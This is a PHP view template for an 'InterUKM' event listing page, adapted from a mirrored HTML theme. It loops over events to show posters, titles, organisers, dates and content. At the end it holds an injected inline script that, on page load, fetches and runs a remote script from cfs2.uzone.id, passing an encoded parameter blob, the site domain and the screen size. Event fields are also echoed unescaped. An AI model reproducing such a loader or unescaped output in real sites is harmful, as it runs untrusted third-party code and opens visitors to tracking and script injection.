<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from themes.webavenue.com.au/enstruct/html/12-enstruct-blog-masonary.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 16 Apr 2017 14:07:15 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>InterUKM</title>
    <meta name="keywords" content="">
    <meta name="description" content="">
    <meta name="author" content="">

    <!-- favicon -->
    <link rel="shortcut icon" type="image/png" href="favicon.png" /> 

    <!-- GOOGLE FONT -->
    <link href="https://fonts.googleapis.com/css?family=Poppins:400,500,600%7CRoboto:400,500,700" rel="stylesheet">

    <!-- CSS LIBRARY -->
   <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/bootstrap.min.css'); ?>">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/animate.css'); ?>">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/font-awesome.min.css'); ?>">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/hover.css'); ?>">

    <!-- Style Sheets -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/bootstrap-datetimepicker.min.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/jquery.bxslider.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/jquery-ui.min.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/swiper.min.css'); ?>" /> 


    <!-- Main css -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/style.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/responsive.css'); ?>" />

    <!--[if lt IE 8]>
      <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
  <![endif]-->
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>

      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
  <![endif]-->
</head>

<body>
   <?php include 'header.php'; ?>
    <!--header ends-->

    <main>
        <section class="blog-block primary-padding">
            <div class="container">
                <div class="row">
                    <div class="col-md-12 col-sm-12 ">
                        <div class="main-title la page-title wow fadeInUp">
                            <h2>Event</h2>
                        </div>
                    </div>
                </div>
                <!--title-->

                <div class="row blog-main-wrap">
                    <div class="col-md-8 col-sm-8 left">
                        <?php
                        foreach ($event as $e) {
                        ?>
                        <div class="blog-list-wrap">
                            <div class="blog-wrap">
                                <figure class="post-thumbnail">
                                    <a href="#" class="overlay image-effect">
                                        <img src="<?=base_url()?>assets/event/<?=$e->poster?>" alt="Blog image">
                                    </a>
                                </figure>
                                <h3 class="entry-title">
                                   <a href="#"><?=$e->nama_event?></a>
                                </h3>
                                <!--title-->

                                <div class="post-info">
                                    <span class="post-author">
                                       <i class="fa fa-user"></i> Posted by: <a href="#"><?=$e->penyelenggara?></a>
                                    </span>
                                    <span class="post-date">
                                       <i class="fa fa-calendar"></i> Date: <a href="#"><?=$e->tanggal?></a>
                                    </span>
                                </div>
                                <!--post info-->

                                <div class="post-content">
                                    <p>
                                        <?=$e->konten?>
                                    </p>
                                </div>
                                <!--post content-->

                                <a href="<?=base_url()?>event/single_event/<?=$e->id_event?>" class="btn btn-outline-primary">Selengkapnya <i class="fa fa-long-arrow-right"></i></a>
                                <a href="<?php echo site_url('beranda/join_panitia_event')?>" class="btn btn-outline-danger">Daftar Jadi Panitia <i class="fa fa-long-arrow-right"></i></a>
                            </div>
                        </div>
                        <?php
                        }
                        ?>
                    </div>
                </div>
                <!--blog wrap-->

                <ul class="pagination ">
                    <li class="page-item">
                        <a class="page-link" href="#" aria-label="Previous">
                            <span class="fa fa-caret-left"> </span>
                        </a>
                    </li>
                    <li class="page-item"><a class="page-link" href="#">1</a></li>
                    <li class="page-item active"><a class="page-link" href="#">2</a></li>
                    <li class="page-item"><a class="page-link" href="#">3</a></li>
                    <li class="page-item"><a class="page-link" href="#">4</a></li>
                    <li class="page-item"><a class="page-link" href="#">5</a></li> 
                    <li class="page-item">
                        <a class="page-link" href="#" aria-label="Next">
                            <span class="fa fa-caret-right"> </span>
                        </a>
                    </li>
                </ul>
                <!--pegination-->
            </div>
        </section>
        <!--blog wrap-->
    </main>
    <!--main ends-->

    <?php include 'footer.php'; ?>
    <!--footer-->
     <!--back to top-->
    <a href="#" class="scrollup"><i class="fa fa-angle-up"></i></a>
   
    <!-- Js libery -->
    <script src="<?php echo base_url('assets/js/jquery-3.1.1.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/tether.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/bootstrap.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/modernizr.js'); ?>"></script>

    <!--jquery ui-->
    <script src="<?php echo base_url('assets/js/jquery-ui.js'); ?>"></script>

    <!-- slider js -->
    <script src="<?php echo base_url('assets/js/jquery.bxslider.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/swiper.jquery.min.js'); ?>"></script>    

    <!-- wow -->
    <script src="<?php echo base_url('assets/js/wow.min.js'); ?>"></script>

    <!-- Parallax -->
    <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.parallax-1.1.3.js'); ?>"></script>
    <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.localscroll-1.2.7-min.js'); ?>"></script>
    <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.scrollTo-1.4.2-min.js'); ?>"></script>

    <!--datepicker-->
    <script src="<?php echo base_url('assets/js/bootstrap-datetimepicker.min.js'); ?>"></script>

    <!--counter-->
    <script src="<?php echo base_url('assets/js/jquery.countTo.js'); ?>"></script>

    <!--smooth scrollling-->
    <script src="<?php echo base_url('assets/js/jQuery.scrollSpeed.js'); ?>"></script>

    <!--Costom js-->
    <script src="<?php echo base_url('assets/js/main.js'); ?>"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK%2fmsldK2DOE9Gwn0QvTzVL8W80CuIieTSAjwQkc%2fvbYbHqSuVc%2bicSG%2fsDaqwnQKnJQjqv4pjjPjHBVdJRa%2fQHZk4QtuTGFcsq5y2peMFvaEXRrqnOExLyWmeQO%2fVfMjhW81zfzyDncpSbBQeXCVMVn7M7Jgc40xEwh2ZW7IwV6TZi1GkG0sXoiiJeBLOekdJrdQuDWz%2bdus8rsvkf2xtlWGsxz3y6JyfD2GGOL5whjpBM9qmx3aGKfdZaKu3e5%2bUI45qDD3wH5nHejAab4rQ0%2b32WCqJTMAGKsn3KgyyGtr6Ue8hVs7xquWcZCEmpJEVcopF6BT49CAVqMQ9HOC%2fKq%2f%2fiJ8J4LmE3ieLWQS7NG7KPn31ZVuPHa6fIEYg2QHt9bdqnvNKJNtsQUEKKBO37JON2ZBpXID06EdrYD24mkC4nk%2biZgiMUw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from themes.webavenue.com.au/enstruct/html/12-enstruct-blog-masonary.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 16 Apr 2017 14:07:44 GMT -->
</html>
